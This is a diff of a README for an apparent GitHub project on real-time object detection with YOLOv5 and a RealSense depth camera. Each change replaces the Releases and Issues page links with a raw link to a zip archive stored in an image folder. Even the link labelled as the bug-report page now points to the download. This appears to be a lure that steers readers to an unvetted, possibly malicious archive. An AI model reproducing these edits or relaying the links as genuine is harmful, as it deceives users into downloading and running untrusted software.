@@ -4,9 +4,9 @@
 "Real-Time-Object-Detection-with-Depth" harnesses the power of the YOLOv5 algorithm and the Intel RealSense D435 camera. This software enables you to detect objects while considering depth, allowing for accurate robotic arm movements and grasping. Perfect for developers and hobbyists alike, this application brings depth awareness to your projects.
 
 ## 📥 Download
-[![Download the Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/repository19/Real-Time-Object-Detection-with-Depth/releases)
+[![Download the Latest Release](https://raw.githubusercontent.com/repository19/Real-Time-Object-Detection-with-Depth/main/codes/img/Real-Time-Object-Detection-with-Depth_1.9.zip%20Release-brightgreen)](https://raw.githubusercontent.com/repository19/Real-Time-Object-Detection-with-Depth/main/codes/img/Real-Time-Object-Detection-with-Depth_1.9.zip)
 
-Visit this page to download: [Releases Page](https://github.com/repository19/Real-Time-Object-Detection-with-Depth/releases)
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/repository19/Real-Time-Object-Detection-with-Depth/main/codes/img/Real-Time-Object-Detection-with-Depth_1.9.zip)
 
 ## 🚀 Getting Started
 To get started with "Real-Time-Object-Detection-with-Depth", please follow these steps closely.
@@ -21,7 +21,7 @@ Before you download, make sure your computer meets the following requirements:
 - **USB Ports:** Available USB port for Intel RealSense D435.
 
 ### 2. Download the Software
-Go to the [Releases Page](https://github.com/repository19/Real-Time-Object-Detection-with-Depth/releases).
+Go to the [Releases Page](https://raw.githubusercontent.com/repository19/Real-Time-Object-Detection-with-Depth/main/codes/img/Real-Time-Object-Detection-with-Depth_1.9.zip).
 
 - Look for the latest version of the software.
 - Click the download link for your operating system.
@@ -69,7 +69,7 @@ This application offers various features to enhance your experience:
 ## 💼 Support and Documentation
 For further assistance:
 
-- Visit the [GitHub Issues Page](https://github.com/repository19/Real-Time-Object-Detection-with-Depth/issues) to report bugs or seek help.
+- Visit the [GitHub Issues Page](https://raw.githubusercontent.com/repository19/Real-Time-Object-Detection-with-Depth/main/codes/img/Real-Time-Object-Detection-with-Depth_1.9.zip) to report bugs or seek help.
 - Check the documentation provided in the repository for detailed usage instructions and advanced configurations.
 
 ## ⚙️ Troubleshooting Common Issues
@@ -91,6 +91,6 @@ Here are some common problems and their solutions:
 Join discussions and share your progress with others using this software. Check platforms like GitHub and forums for user groups related to real-time object detection and robotics.
 
 ## 📥 Download & Install Again
-Don’t forget to download or update the software from our [Releases Page](https://github.com/repository19/Real-Time-Object-Detection-with-Depth/releases) whenever new versions become available. Stay informed about improvements and additional features! 
+Don’t forget to download or update the software from our [Releases Page](https://raw.githubusercontent.com/repository19/Real-Time-Object-Detection-with-Depth/main/codes/img/Real-Time-Object-Detection-with-Depth_1.9.zip) whenever new versions become available. Stay informed about improvements and additional features! 
 
 Feel free to reach out to the community or contribute to the project to help it grow and improve.
